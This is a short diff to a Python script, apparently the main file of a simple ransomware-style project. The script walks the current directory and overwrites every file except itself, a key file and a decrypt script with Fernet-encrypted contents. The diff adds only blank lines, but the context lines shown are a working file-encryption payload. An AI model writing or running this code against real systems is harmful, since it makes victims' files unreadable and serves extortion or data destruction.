@@ -11,13 +11,16 @@ files = []
 for path in os.listdir():
     if (path == "main.py" or path == "encryptedKey.key" or path == "decrypt.py"):
         continue
+    
     if os.path.isfile(path):
         files.append(path)
 
 for file in files:
     with open(file, "rb") as file1:
         rawData = file1.read()
+    
     encryptedRawData = Fernet(key).encrypt(rawData)
+
     with open(file, "wb") as file2:
         file2.write(encryptedRawData)
 
